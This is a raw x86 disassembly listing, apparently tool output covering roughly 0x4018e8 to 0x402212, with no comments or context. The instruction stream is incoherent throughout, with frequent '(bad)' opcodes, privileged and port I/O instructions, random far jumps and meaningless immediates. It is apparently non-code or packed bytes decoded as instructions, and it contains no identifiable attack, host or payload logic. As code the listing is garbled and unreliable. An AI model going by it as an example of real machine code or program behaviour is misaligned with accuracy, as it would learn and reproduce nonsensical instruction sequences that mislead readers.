  4018e8:	cmp    al,0x23
  4018ea:	arpl   WORD PTR [edi],cx
  4018ec:	jl     0x401929
  4018ee:	or     edi,eax
  4018f0:	(bad)  
  4018f1:	ins    BYTE PTR es:[edi],dx
  4018f2:	int3   
  4018f3:	inc    DWORD PTR [ebx-0x7295fc1f]
  4018f9:	pop    ss
  4018fa:	or     ebp,eax
  4018fc:	test   DWORD PTR [ecx+0xc],0x0
	...
  401913:	add    BYTE PTR [ebp+0x30],dl
  401916:	or     BYTE PTR [eax],al
  401918:	mov    ecx,0xb450e0f6
  40191d:	aad    0x2e
  40191f:	adc    ah,cl
  401921:	ins    DWORD PTR es:[edi],dx
  401922:	repz jb 0x4018b2
  401925:	inc    DWORD PTR cs:[ebx+0x740b75c1]
  40192c:	xchg   esi,esi
  40192e:	pop    ecx
  40192f:	or     BYTE PTR [edi],al
  401931:	pusha  
  401932:	(bad)  
  401933:	jne    0x4018c9
  401935:	add    bl,BYTE PTR [edx+0x8]
  401938:	push   ebp
  401939:	xor    BYTE PTR [eax],cl
  40193b:	add    cl,al
  40193d:	mul    al
  40193f:	or     DWORD PTR [eax+0x16],0x5c
  401943:	pop    eax
  401944:	je     0x4018ce
  401946:	sbb    al,0x40
  401948:	mov    ebp,fs
  40194a:	jp     0x40194d
  40194c:	iret   
  40194d:	repnz push DWORD PTR [ebp-0x80]
  401951:	xchg   esp,eax
  401952:	jle    0x401995
  401954:	in     al,0x5b
  401956:	lods   al,BYTE PTR ds:[esi]
  401957:	test   DWORD PTR [esp+edx*4-0x35f8fc1f],0xee7e8ae9
  401962:	loope  0x40195a
  401964:	inc    ecx
  401965:	test   BYTE PTR [esi],dh
  401967:	jno    0x401929
  401969:	arpl   WORD PTR [ebx+edi*8-0x9161645],si
  401970:	pop    esi
  401971:	mov    BYTE PTR [eax],bh
  401973:	ret    0x9498
  401976:	mov    esp,0x8a
	...
  40198b:	add    BYTE PTR [eax+0x3cfc2517],dh
  401991:	mov    esp,0xd47c8589
  401996:	loope  0x401993
  401998:	(bad)  
  401999:	xchg   ebp,eax
  40199a:	and    dh,bh
  40199c:	dec    ebx
  40199d:	fyl2xp1 
  40199f:	add    ecx,DWORD PTR [esp+edx*4+0x60c9bee1]
  4019a6:	loope  0x4019ab
  4019a8:	mov    WORD PTR [edx+edi*2-0xcf06bb0],ss
  4019af:	mov    cl,dl
  4019b1:	pop    esp
  4019b2:	xor    DWORD PTR [edx-0x72],ebp
  4019b5:	arpl   WORD PTR [eax+edi*8],si
  4019b8:	dec    ebx
  4019b9:	jmp    0x8cfa1087
  4019be:	mov    esi,0x2c0fa051
  4019c3:	cld    
  4019c4:	inc    ebp
  4019c5:	push   esi
  4019c6:	in     eax,0x3
  4019c8:	ror    DWORD PTR [edi],0x85
  4019cb:	or     BYTE PTR [eax+0x5c],0x31
  4019cf:	pop    esp
  4019d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019d1:	push   eax
  4019d2:	icebp  
  4019d3:	inc    ebx
  4019d4:	mov    WORD PTR [ebx+esi*8+0x4],ds
  4019d8:	iret   
  4019d9:	bound  ebp,QWORD PTR [esi+0x8940440]
  4019df:	jmp    0x250fae73
  4019e4:	hlt    
  4019e5:	xchg   ebx,eax
  4019e6:	or     cl,ch
  4019e8:	(bad)  
  4019e9:	minps  xmm6,xmm1
  4019ec:	push   ss
  4019ed:	xchg   BYTE PTR [ebp+0xac],al
	...
  401a03:	add    bh,dl
  401a05:	ret    
  401a06:	(bad)  
  401a07:	call   0x473502e6
  401a0c:	cmp    al,0x5c
  401a0e:	div    DWORD PTR [edi+edx*4-0x3d22a59d]
  401a15:	call   0x634e5b1a
  401a1a:	mul    DWORD PTR [esi]
  401a1c:	aas    
  401a1d:	minps  xmm6,xmm1
  401a20:	push   ss
  401a21:	xchg   BYTE PTR [edx-0x17],ah
  401a24:	and    eax,0x9b94f794
  401a29:	bound  edi,QWORD PTR [ebp+0x1]
  401a2c:	sub    al,0x0
  401a2f:	(bad)  
  401a30:	fmul   QWORD PTR [eax+0x5cdc6250]
  401a36:	or     edx,DWORD PTR [ebx+ecx*4+0x6a5fd89d]
  401a3d:	scas   eax,DWORD PTR es:[edi]
  401a3e:	enter  0x4eb0,0x8d
  401a42:	or     BYTE PTR [ecx-0x16f76b71],dl
  401a48:	inc    esi
  401a49:	push   edi
  401a4a:	add    cl,ch
  401a4c:	fimul  DWORD PTR ds:0x614c6ae4
  401a52:	pop    eax
  401a53:	adc    DWORD PTR [eax-0x77d6e663],ebp
  401a59:	pop    esp
  401a5a:	jp     0x401a44
  401a5c:	dec    esp
  401a5d:	(bad)  
  401a5e:	not    DWORD PTR [eax+edi*2]
  401a61:	popa   
  401a62:	jge    0x401a45
  401a64:	daa    
  401a65:	jmp    0x40a961
	...
  401a7a:	add    BYTE PTR [eax],al
  401a7c:	sbb    DWORD PTR [esi+0x620800c8],ecx
  401a82:	rol    dl,0xf1
  401a85:	xchg   ebp,eax
  401a86:	adc    DWORD PTR [ebp-0x13],0xc
  401a8a:	sbb    cl,BYTE PTR [ebp-0xa7a358]
  401a90:	enter  0xf785,0x75
  401a94:	icebp  
  401a95:	push   0xc642087d
  401a9a:	add    al,0x85
  401a9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a9d:	loopne 0x401aba
  401a9f:	mov    edi,eax
  401aa1:	imul   esi,DWORD PTR [ebx],0xff2e545
  401aa7:	mov    eax,0x895a4
  401aac:	dec    esi
  401aad:	bound  esp,QWORD PTR [edx]
  401aaf:	sar    BYTE PTR [esi-0x6a],0x23
  401ab3:	rcr    BYTE PTR [esi+edx*2+0x4],0x0
  401ab8:	fmul   DWORD PTR [esp+eiz*8]
  401abb:	sub    DWORD PTR [ecx+0x5c],0x5e
  401abf:	push   eax
  401ac0:	sub    eax,0x35119bed
  401ac5:	xchg   ebp,eax
  401ac6:	lock jb 0x401b2d
  401ac9:	push   esp
  401aca:	test   DWORD PTR [ebx+0x740899e0],0x875147b
  401ad4:	jne    0x401ac8
  401ad6:	movntps XMMWORD PTR ds:0x31c2c1c7,xmm4
  401add:	xchg   ebp,eax
  401ade:	mov    edi,DWORD PTR [ebp+0x0]
	...
  401af1:	add    BYTE PTR [eax],al
  401af3:	add    BYTE PTR [ebp-0x6b],ah
  401af6:	jge    0x401b02
  401af8:	or     eax,0x25000896
  401afd:	mov    ecx,0x839551c2
  401b03:	jne    0x401b26
  401b05:	and    BYTE PTR [ebp-0x4],cl
  401b08:	xor    eax,0x8c000895
  401b0d:	test   BYTE PTR [esi+0x8],0x7
  401b11:	pop    ebp
  401b12:	mov    es,WORD PTR [ebp+0x8]
  401b15:	jnp    0x401b14
  401b17:	jne    0x401ab5
  401b19:	mov    ebp,edi
  401b1b:	jne    0x401aa1
  401b1d:	jmp    0x772:0x2b091059
  401b24:	mov    bh,0xab
  401b26:	pop    ebp
  401b27:	leave  
  401b28:	into   
  401b29:	outs   dx,BYTE PTR ds:[esi]
  401b2a:	or     eax,DWORD PTR [ebx+0x750bc759]
  401b30:	mov    edx,DWORD PTR [esi-0x532aa134]
  401b36:	lldt   WORD PTR [edi]
  401b39:	cmp    bh,bh
  401b3b:	add    edi,DWORD PTR [ebx+edx*4-0x48c6efc9]
  401b42:	mov    bl,0x1
  401b44:	mov    WORD PTR [ebx+0xb],gs
  401b47:	pop    esi
  401b48:	aad    0xac
  401b4a:	sldt   WORD PTR [ecx-0xa]
  401b4e:	out    dx,eax
  401b4f:	or     eax,0x8bffec82
  401b55:	(bad)  
  401b56:	push   edx
  401b57:	push   0x0
	...
  401b6c:	cwde   
  401b6d:	cmp    ecx,DWORD PTR [ebx+0x0]
  401b70:	je     0x401b4e
  401b72:	or     al,bl
  401b74:	jae    0x401b8a
  401b76:	or     ebp,DWORD PTR [edx-0x74]
  401b79:	ret    
  401b7a:	punpckhdq mm1,QWORD PTR [ebx+eax*8+0x6d8c680f]
  401b82:	or     eax,DWORD PTR [eax-0x180b36ad]
  401b88:	jg     0x401ba6
  401b8a:	or     al,0x0
  401b8c:	adc    eax,0xc140f8b9
  401b91:	jno    0x401b47
  401b93:	ret    0x6d84
  401b96:	push   ebp
  401b97:	add    BYTE PTR [ecx],bl
  401b99:	xchg   ebp,eax
  401b9a:	and    al,0xec
  401b9c:	mov    esp,0x8c13e1ec
  401ba1:	xchg   esp,eax
  401ba2:	ins    BYTE PTR es:[edi],dx
  401ba3:	mov    DWORD PTR [eax+esi*2],edx
  401ba6:	xchg   bl,dh
  401ba8:	pop    esp
  401ba9:	pop    edi
  401baa:	hlt    
  401bab:	out    dx,eax
  401bac:	hlt    
  401bad:	mov    DWORD PTR [eax+0x4],esi
  401bb0:	mov    WORD PTR [ebx+0x5f8279a1],cs
  401bb6:	cld    
  401bb7:	out    dx,eax
  401bb8:	hlt    
  401bb9:	(bad)  
  401bba:	push   eax
  401bbb:	add    al,0x8c
  401bbd:	stos   DWORD PTR es:[edi],eax
  401bbe:	and    DWORD PTR [ebp-0xd1e7332],edi
  401bc4:	pop    ecx
  401bc5:	pop    esp
  401bc6:	push   esp
  401bc7:	mov    esp,eax
  401bc9:	outs   dx,DWORD PTR ds:[esi]
  401bca:	dec    esi
  401bcb:	repz pop esp
  401bcd:	pop    edi
  401bce:	mov    esp,0xff
	...
  401be3:	add    BYTE PTR [ebx-0x4c0cc16f],dh
  401be9:	adc    esp,DWORD PTR [ebx+ebp*8-0xc921674]
  401bf0:	sbb    DWORD PTR [eax+0x19],esp
  401bf3:	fstp   QWORD PTR [esp+edx*4-0x6b72541f]
  401bfa:	loope  0x401bff
  401bfc:	push   ebp
  401bfd:	push   edx
  401bfe:	stc    
  401bff:	add    ebx,ecx
  401c01:	or     eax,DWORD PTR ds:0x58ecd454
  401c07:	push   ss
  401c08:	int3   
  401c09:	xchg   esp,eax
  401c0a:	stc    
  401c0b:	jne    0x401b9a
  401c0d:	push   ebx
  401c0e:	out    dx,al
  401c0f:	pop    ebp
  401c10:	mov    gs,edx
  401c12:	loope  0x401c06
  401c14:	loope  0x401ba2
  401c16:	leave  
  401c17:	xchg   ecx,eax
  401c18:	push   ecx
  401c19:	pop    edi
  401c1a:	(bad)  
  401c1b:	mov    esp,0x58e1984e
  401c20:	pop    ss
  401c21:	jo     0x401c34
  401c23:	dec    esp
  401c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c25:	sbb    al,0x8
  401c27:	fcmovne st,st(7)
  401c29:	xchg   esp,eax
  401c2a:	lock cmp edx,DWORD PTR [ecx-0x77ec08ad]
  401c31:	jmp    0x16e0:0x8c949e08
  401c38:	sbb    eax,0xd1a0f75f
  401c3d:	xchg   edi,eax
  401c3e:	or     BYTE PTR [ebx+eax*4],bl
  401c41:	jo     0x401bce
  401c43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c44:	out    0xc3,eax
  401c46:	push   eax
  401c47:	add    DWORD PTR [eax],eax
	...
  401c59:	add    BYTE PTR [eax],al
  401c5b:	add    dl,al
  401c5d:	or     DWORD PTR [eax-0x17],0x2a09e1f7
  401c64:	ficomp WORD PTR [esi+0x7d]
  401c67:	in     eax,dx
  401c68:	push   cs
  401c69:	f2xm1  
  401c6b:	cs inc esp
  401c6d:	pusha  
  401c6e:	or     cl,ch
  401c70:	(bad)  
  401c71:	xchg   esp,eax
  401c72:	(bad)  
  401c73:	jmp    0x3e450536
  401c78:	xor    al,0x8c
  401c7a:	loopne 0x401c22
  401c7c:	mov    esp,0x4462f75e
  401c81:	mov    WORD PTR [ebx-0xb176105],es
  401c87:	push   ds
  401c88:	adc    al,0x5c
  401c8a:	neg    DWORD PTR [edi+edx*4+0x48f15a5d]
  401c91:	push   ebx
  401c92:	add    cl,ch
  401c94:	in     al,0x9
  401c96:	in     al,0x99
  401c98:	(bad)  
  401c99:	in     al,dx
  401c9a:	adc    dl,bl
  401c9c:	iret   
  401c9d:	xchg   esp,eax
  401c9e:	lock jnp 0x401c31
  401ca1:	push   ecx
  401ca2:	not    DWORD PTR [ebx-0x78]
  401ca5:	pop    ebp
  401ca6:	jge    0x401c99
  401ca8:	aaa    
  401ca9:	aaa    
  401caa:	not    esi
  401cac:	pop    ebp
  401cad:	dec    esp
  401cae:	retf   0x8fe5
  401cb1:	mov    DWORD PTR [ebx+0x5de05900],0x8aea614
  401cbb:	jne    0x401cde
  401cbd:	sbb    ecx,edx
  401cbf:	adc    BYTE PTR [eax],al
	...
  401cd1:	add    BYTE PTR [eax],al
  401cd3:	add    BYTE PTR ds:0xea107d65,dh
  401cd9:	in     eax,0x4
  401cdb:	inc    DWORD PTR [eax-0x71910a0]
  401ce1:	arpl   di,si
  401ce3:	mov    eax,eax
  401ce5:	jl     0x401d10
  401ce7:	add    bh,BYTE PTR [edi+edx*2]
  401cea:	sbb    BYTE PTR [eax],al
  401cec:	mov    al,ds:0x2183e4df
  401cf1:	div    DWORD PTR gs:[ebp-0x37]
  401cf5:	mov    edi,0x6e308d0c
  401cfa:	pop    eax
  401cfb:	inc    eax
  401cfd:	pop    ecx
  401cfe:	out    dx,eax
  401cff:	ret    
  401d00:	cmp    ah,BYTE PTR [ebx-0x9]
  401d03:	mov    esi,eax
  401d05:	pop    ebp
  401d06:	mov    bh,BYTE PTR [eax]
  401d08:	mov    ch,0xe5
  401d0a:	jnp    0xc8478b00
  401d10:	dec    esi
  401d11:	xchg   esi,eax
  401d12:	and    eax,eax
  401d14:	ins    BYTE PTR es:[edi],dx
  401d15:	push   esi
  401d16:	add    BYTE PTR [eax],al
  401d18:	loopne 0x401cfa
  401d1a:	in     al,0x83
  401d1c:	jno    0x401d82
  401d1e:	div    DWORD PTR [ebp-0x57]
  401d21:	mov    edi,0x63308d0a
  401d26:	pop    eax
  401d27:	inc    DWORD PTR [eax]
  401d29:	pop    edx
  401d2a:	out    dx,eax
  401d2b:	xchg   edi,eax
  401d2c:	jp     0x401d92
  401d2e:	test   DWORD PTR [ebx+0x388a5d20],0xf00e575
	...
  401d4c:	add    dl,dh
  401d4e:	test   BYTE PTR [esi+0x2b0a4031],0x8c
  401d55:	sub    esi,DWORD PTR [edx+0x5e6b94c2]
  401d5b:	mov    esi,DWORD PTR [eax]
  401d5d:	jmp    0x6a08:0xa83bfccf
  401d64:	(bad)  
  401d65:	clc    
  401d66:	dec    esi
  401d67:	(bad)  
  401d68:	mov    esp,0x34087e2e
  401d6d:	cmp    ecx,0x4ee21bff
  401d73:	or     al,0xf
  401d75:	inc    ebx
  401d76:	or     esi,DWORD PTR [edx+edx*4+0x3e]
  401d7a:	mov    cl,0x45
  401d7c:	add    eax,DWORD PTR [edx]
  401d7e:	or     eax,0xcd23cc2b
  401d83:	or     BYTE PTR [eax+eax*4-0x77e8138b],cl
  401d8a:	sbb    al,0x83
  401d8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d8d:	imul   edi,DWORD PTR [esi+0x4],0xffffffc5
  401d91:	test   al,0xf7
  401d93:	call   edx
  401d95:	aas    
  401d96:	idiv   esi
  401d98:	inc    ecx
  401d99:	jae    0x401d6e
  401d9b:	rol    al,1
  401d9d:	aad    0xf8
  401d9f:	or     ecx,esp
  401da1:	daa    
  401da2:	hlt    
  401da3:	mov    bl,BYTE PTR [ecx+0x3b]
  401da6:	rol    BYTE PTR [edx],0x8c
  401da9:	imul   ecx,DWORD PTR [ebx],0x0
  401dac:	mov    bh,0x67
  401dae:	push   ebp
  401daf:	add    DWORD PTR [eax],eax
	...
  401dc1:	add    BYTE PTR [eax],al
  401dc3:	add    BYTE PTR [ebx+0x19fef707],bl
  401dc9:	jae    0x401d9e
  401dcb:	cmp    eax,0xc9f88b88
  401dd0:	dec    esi
  401dd1:	bound  ecx,QWORD PTR [ebx]
  401dd3:	push   ebp
  401dd4:	pop    es
  401dd5:	mov    cl,BYTE PTR [esp+eax*8+0x7573fc70]
  401ddc:	cwde   
  401ddd:	pop    ss
  401dde:	or     ecx,DWORD PTR [ebp+0x54ed94c9]
  401de4:	pop    ebx
  401de5:	loop   0x401dd8
  401de7:	push   ebp
  401de8:	push   ebx
  401de9:	loop   0x401dd4
  401deb:	fcmovnbe st,st(6)
  401ded:	imul   esp,ecx,0x3
  401df0:	xchg   edi,eax
  401df1:	push   esp
  401df2:	xor    eax,0xb5da0f06
  401df7:	add    al,0xb9
  401df9:	xchg   ebx,eax
  401dfa:	or     al,ah
  401dfc:	retf   0xa34d
  401dff:	add    BYTE PTR [edi+ecx*1+0x648ff024],cl
  401e06:	fmul   DWORD PTR [eax+0x7c]
  401e09:	loope  0x401dbd
  401e0b:	lods   al,BYTE PTR ds:[esi]
  401e0c:	lea    edx,[ecx+eiz*8-0x5cb29dfd]
  401e13:	add    BYTE PTR [ecx+eax*8+0x510de07a],cl
  401e1a:	stc    
  401e1b:	out    dx,al
  401e1c:	jmp    0x401e79
  401e1e:	adc    bl,BYTE PTR [ebx]
  401e20:	(bad)  
  401e21:	out    dx,al
  401e22:	loope  0x401e7d
  401e24:	mov    esi,gs
  401e26:	jecxz  0x401e81
	...
  401e3c:	mov    esi,gs
  401e3e:	loop   0x401e9b
  401e40:	mov    WORD PTR [ecx+eiz*8-0x21e3c3d],ss
  401e47:	fstp   TBYTE PTR [edx+ebp*2-0x2dfafc1f]
  401e4e:	cmp    eax,0x26c72044
  401e53:	jns    0x401de9
  401e55:	ins    BYTE PTR es:[edi],dx
  401e56:	fsub   st(5),st
  401e58:	fwait
  401e59:	pop    ebx
  401e5a:	cs dec ecx
  401e5c:	xchg   esp,eax
  401e5d:	xchg   esp,eax
  401e5e:	loope  0x401e63
  401e60:	mov    WORD PTR [edi],cs
  401e62:	mov    esp,0x7c8616fb
  401e67:	dec    ecx
  401e68:	je     0x401e2e
  401e6a:	cdq    
  401e6b:	or     DWORD PTR [esp+edx*4+0x110ce908],0x70
  401e73:	out    dx,al
  401e74:	jb     0x401ed1
  401e76:	pop    eax
  401e77:	out    0xd4,al
  401e79:	mov    edi,?
  401e7b:	cmp    ecx,DWORD PTR [edi+edx*1-0x1e702e8b]
  401e82:	or     ebp,DWORD PTR [edx]
  401e84:	addr16 jl 0x401e7e
  401e87:	cmp    al,0x28
  401e89:	or     DWORD PTR [ebp-0x8a4dcbf],ecx
  401e8f:	sbb    DWORD PTR [ebx],edi
  401e91:	loope  0x401e87
  401e93:	sar    DWORD PTR [eax+0x16a6f75b],0x1b
  401e9a:	jl     0x401e87
  401e9c:	ss sbb edi,esi
  401e9f:	sbb    al,0x0
	...
  401eb1:	add    BYTE PTR [eax],al
  401eb3:	add    ah,bh
  401eb5:	imul   ebp,DWORD PTR [ebx-0x7c6b7081],0xffffffaa
  401ebc:	inc    esi
  401ebd:	dec    ebp
  401ebe:	retf   0x8ff1
  401ec1:	rol    DWORD PTR [ebx-0xfaff17b],0x6e
  401ec8:	fs mov al,ah
  401ecb:	mov    esi,esp
  401ecd:	pop    edx
  401ece:	div    DWORD PTR [eax+0x44]
  401ed1:	pop    esp
  401ed2:	iret   
  401ed3:	lods   al,BYTE PTR ds:[esi]
  401ed4:	mov    ebx,0x8fe90893
  401ed9:	pop    ebx
  401eda:	jge    0x401ed1
  401edc:	xlat   BYTE PTR ds:[ebx]
  401edd:	push   ds
  401ede:	cmc    
  401edf:	mov    ds:0x26e55d0e,al
  401ee5:	xchg   BYTE PTR [edx-0x17],ah
  401ee8:	inc    ebp
  401ee9:	xchg   esp,eax
  401eea:	neg    DWORD PTR [ebx+ebp*4-0x5dde82a6]
  401ef1:	loopne 0x401ef3
  401ef3:	push   ss
  401ef4:	add    al,0x89
  401ef6:	idiv   DWORD PTR [ebx+0xca4b93]
  401efc:	jge    0x401e94
  401efe:	pop    ebp
  401eff:	mov    eax,DWORD PTR [ecx-0x450733ea]
  401f05:	int3   
  401f06:	lock add BYTE PTR [ebp-0x6a],dh
  401f0a:	or     bh,al
  401f0c:	test   al,0x64
  401f0e:	or     BYTE PTR [eax],al
  401f10:	gs xchg esi,eax
  401f12:	adc    DWORD PTR [ebp+0x2d],0xffffffdd
  401f16:	sbb    cl,BYTE PTR [ebp+0x0]
	...
  401f2c:	push   0x246a5868
  401f31:	imul   edi,DWORD PTR [ebp-0x4],0xfff0e1f2
  401f38:	push   0x3952f658
  401f3d:	fisttp QWORD PTR [ebp-0x8]
  401f40:	fcom   QWORD PTR [esi+0xc]
  401f43:	add    BYTE PTR [eax-0x25],bl
  401f46:	in     al,0x6a
  401f48:	hlt    
  401f49:	fimul  DWORD PTR [ebp+0xc]
  401f4c:	lds    esp,FWORD PTR [edi+0x7d]
  401f4f:	or     BYTE PTR ds:0x72fff4a4,bl
  401f55:	sbb    eax,0xc2f508ca
  401f5a:	sub    esp,0xffffff8f
  401f5d:	mov    WORD PTR [ebp-0x83a1ebb],es
  401f63:	jne    0x401f42
  401f65:	cmp    eax,0x6762fc16
  401f6a:	rol    edx,0xad
  401f6d:	xchg   ebp,eax
  401f6e:	pop    ebp
  401f6f:	mov    esp,DWORD PTR [ecx+0x13]
  401f72:	jne    0x401f80
  401f74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f75:	loope  0x401f93
  401f77:	and    eax,0xffffff85
  401f7a:	or     BYTE PTR [ebx+eax*8+0x68],dh
  401f7e:	jge    0x401f90
  401f80:	jb     0x401f63
  401f82:	add    al,0xff
  401f84:	clc    
  401f85:	pop    ebp
  401f86:	out    dx,eax
  401f87:	std    
  401f88:	mov    WORD PTR [esi-0x52aa001b],es
  401f8e:	or     BYTE PTR [eax],al
	...
  401fa4:	loope  0x401f8c
  401fa6:	call   0xe47c19aa
  401fab:	jne    0x401f41
  401fad:	xchg   ebx,eax
  401fae:	mov    eax,0x886a63ff
  401fb3:	jge    0x402031
  401fb5:	imul   edi,DWORD PTR [edi+0x14],0xf
  401fb9:	mov    eax,0x71c00008
  401fbe:	in     al,0x75
  401fc0:	pushf  
  401fc1:	dec    edx
  401fc2:	jle    0x401fd0
  401fc4:	cmp    ebx,DWORD PTR [eax+0x19fbe7f4]
  401fca:	in     al,0xff
  401fcc:	push   ebp
  401fcd:	sub    eax,0xf6b8fff7
  401fd2:	xlat   BYTE PTR ds:[ebx]
  401fd3:	sbb    DWORD PTR [ecx-0x798bf4a1],0xfffffffa
  401fda:	jge    0x401fe8
  401fdc:	hlt    
  401fdd:	mov    esp,0x168c00d6
  401fe2:	or     DWORD PTR [ebx],ebp
  401fe4:	int3   
  401fe5:	jp     0x401fcc
  401fe7:	jne    0x401f69
  401fe9:	fidivr DWORD PTR [esi+0x8]
  401fec:	hlt    
  401fed:	popf   
  401fee:	in     al,0xff
  401ff0:	jecxz  0x402025
  401ff2:	leave  
  401ff3:	or     BYTE PTR [eax+ebx*1+0x3fd3ec70],cl
  401ffa:	repz out 0x73,eax
  401ffd:	ret    0xffe4
  402000:	pop    esp
  402001:	push   ebp
  402002:	repz addr16 dec ebx
  402005:	and    ecx,DWORD PTR [edx+0x0]
	...
  40201c:	mov    bl,0x1f
  40201e:	repz out 0x1f,eax
  402021:	mov    ds:0x6b36ffe4,al
  402026:	in     al,0x75
  402028:	test   BYTE PTR [ecx+ebx*1+0x16589357],dl
  40202f:	pop    ecx
  402030:	mov    cs,WORD PTR [ecx]
  402032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402033:	call   ebx
  402035:	push   edi
  402036:	pushf  
  402037:	sti    
  402038:	jae    0x401ff6
  40203a:	push   cs
  40203b:	in     al,dx
  40203c:	jae    0x402029
  40203e:	jecxz  0x4020be
  402040:	rol    DWORD PTR [ecx+edx*4+0x98cd9ec],1
  402047:	ds pop ebx
  402049:	pop    eax
  40204a:	out    dx,al
  40204b:	dec    esp
  40204c:	inc    ebp
  40204d:	push   ebx
  40204e:	in     eax,0x3
  402050:	loope  0x40205d
  402052:	int    0x87
  402054:	dec    eax
  402055:	pop    ecx
  402056:	(bad)  
  402057:	jno    0x401fdd
  402059:	ins    BYTE PTR es:[edi],dx
  40205a:	adc    esi,ebp
  40205c:	xor    ebx,DWORD PTR [eax+0x1a]
  40205f:	inc    ecx
  402060:	cwde   
  402061:	or     eax,0xd20fe824
  402066:	aad    0xfb
  402068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402069:	xchg   esp,eax
  40206a:	scas   al,BYTE PTR es:[edi]
  40206b:	jno    0x401fed
  40206d:	push   edi
  40206e:	sbb    al,0xfc
  402070:	repz xchg esp,eax
  402072:	fwait
  402073:	jmp    0x402078
  402075:	pop    eax
  402076:	sbb    al,0xe8
  402078:	sti    
  402079:	loope  0x402074
  40207b:	fisttp DWORD PTR [edi+0xeb7657]
	...
  402091:	add    BYTE PTR [eax],al
  402093:	add    bl,ch
  402095:	loope  0x402080
  402097:	fistp  DWORD PTR [eax+0x7eb6658]
  40209d:	shr    BYTE PTR [ebp-0x43],cl
  4020a0:	into   
  4020a1:	mov    ecx,fs
  4020a3:	push   eax
  4020a4:	pop    ss
  4020a5:	imul   esp,DWORD PTR [edx-0x40],0xefac4fb8
  4020ac:	mov    WORD PTR [ecx+eiz*8+0x35d20103],ss
  4020b3:	push   esp
  4020b4:	stos   DWORD PTR es:[edi],eax
  4020b5:	loope  0x4020bf
  4020b7:	loope  0x402080
  4020b9:	scas   al,BYTE PTR es:[edi]
  4020ba:	out    0xe9,al
  4020bc:	(bad)  
  4020bd:	adc    eax,ecx
  4020bf:	mov    eax,ds:0xf17d5774
  4020c4:	addr16 pop edx
  4020c6:	icebp  
  4020c7:	push   ss
  4020c8:	ja     0x4020d7
  4020ca:	dec    ebp
  4020cb:	adc    DWORD PTR [edi-0x1f],esp
  4020ce:	hlt    
  4020cf:	adc    DWORD PTR [edi+0x68],edx
  4020d2:	or     cl,ch
  4020d4:	push   0x17
  4020d6:	jl     0x4020b7
  4020d8:	jbe    0x4020bb
  4020da:	lock cdq 
  4020dc:	mov    ecx,0x8d58e094
  4020e1:	xchg   esp,eax
  4020e2:	or     BYTE PTR [eax-0x34],dh
  4020e5:	pusha  
  4020e6:	neg    DWORD PTR [esp+esi*1+0x6c]
  4020ea:	sar    DWORD PTR [ebp+0x3cf7948f],cl
  4020f0:	xor    BYTE PTR [edi-0x2d],ch
  4020f3:	ret    0x5736
  4020f6:	sub    DWORD PTR [eax+eax*1],0x0
	...
  40210a:	add    BYTE PTR [eax],al
  40210c:	sbb    al,0x87
  40210e:	shl    BYTE PTR [esi+0x1cf7c43f],0x10
  402115:	outs   dx,DWORD PTR ds:[esi]
  402116:	call   0x3ab:0xc156f69f
  40211d:	push   edi
  40211e:	pop    esp
  40211f:	(bad)  
  402121:	adc    cl,ah
  402123:	jns    0x4020f3
  402125:	sar    ah,1
  402127:	jmp    0x6448b5bb
  40212c:	dec    esp
  40212d:	pop    eax
  40212e:	pop    eax
  40212f:	outs   dx,BYTE PTR ds:[esi]
  402130:	pop    esp
  402131:	mov    eax,fs
  402133:	sub    DWORD PTR [ebx+edx*4-0x24309bf8],esi
  40213a:	inc    ebp
  40213b:	push   esi
  40213c:	cmp    al,0x8c
  40213e:	loopne 0x4021b5
  402140:	test   al,0x56
  402142:	test   DWORD PTR [eax],0x83f0d43c
  402148:	call   0x89b22db7
  40214d:	pcmpgtw mm7,mm0
  402150:	mov    cl,0x69
  402152:	jge    0x402150
  402154:	jge    0x402140
  402156:	in     al,0x0
  402158:	jne    0x4021b1
  40215a:	mov    bh,0x74
  40215c:	imul   edi,DWORD PTR [di-0x8],0x35
  402161:	mov    eax,0x9564e808
  402166:	or     BYTE PTR [eax],al
  402168:	jp     0x402184
  40216a:	call   eax
  40216c:	in     al,dx
  40216d:	aam    0xfc
  40216f:	inc    DWORD PTR [eax]
	...
  402181:	add    BYTE PTR [eax],al
  402183:	add    al,ah
  402185:	ins    DWORD PTR es:[edi],dx
  402186:	loopne 0x4021ef
  402188:	cmp    DWORD PTR [ecx+0x6d43eb08],edx
  40218e:	jge    0x402198
  402190:	dec    ebp
  402191:	mov    dh,0xf3
  402193:	dec    DWORD PTR [edx+0x78]
  402196:	enter  0xe7c9,0x94
  40219a:	or     bl,ch
  40219c:	xor    edi,DWORD PTR [ecx-0x38]
  40219f:	leave  
  4021a0:	not    DWORD PTR [eax+ecx*1-0xb47d896]
  4021a7:	push   DWORD PTR [eax+0x58]
  4021aa:	out    dx,eax
  4021ab:	add    al,0x2c
  4021ad:	ins    BYTE PTR es:[edi],dx
  4021ae:	test   edi,0x960b0
  4021b4:	in     eax,0x91
  4021b6:	test   DWORD PTR [ebp+0x75],eax
  4021b9:	shl    bh,0x75
  4021bc:	fnstsw WORD PTR [ecx]
  4021be:	repnz sti 
  4021c0:	pop    edx
  4021c1:	imul   ecx,DWORD PTR [ebx+0x7c90557d],0x12
  4021c8:	ficomp DWORD PTR [ecx]
  4021ca:	xor    eax,DWORD PTR [ebp+0x61]
  4021cd:	in     eax,0xf
  4021cf:	mov    eax,0xb6c8c
  4021d4:	mov    edx,ss
  4021d6:	or     ch,BYTE PTR [ebx]
  4021d8:	int3   
  4021d9:	ret    0x2b0e
  4021dc:	int3   
  4021dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021de:	into   
  4021df:	add    al,0x8c
  4021e1:	clc    
  4021e2:	jae    0x4021d0
  4021e4:	cmpxchg ah,ah
  4021e7:	lea    eax,[eax]
	...
  4021f9:	add    BYTE PTR [eax],al
  4021fb:	add    BYTE PTR [ecx-0x51],cl
  4021fe:	pop    esp
  4021ff:	inc    DWORD PTR [ecx]
  402201:	rcr    DWORD PTR fs:[edx],cl
  402204:	jno    0x402271
  402206:	or     eax,DWORD PTR [ebp-0xebfcb4]
  40220c:	stc    
  40220d:	arpl   bx,dx
  40220f:	out    dx,al
  402210:	fs push esi
  402212:	loopne 0x40219d
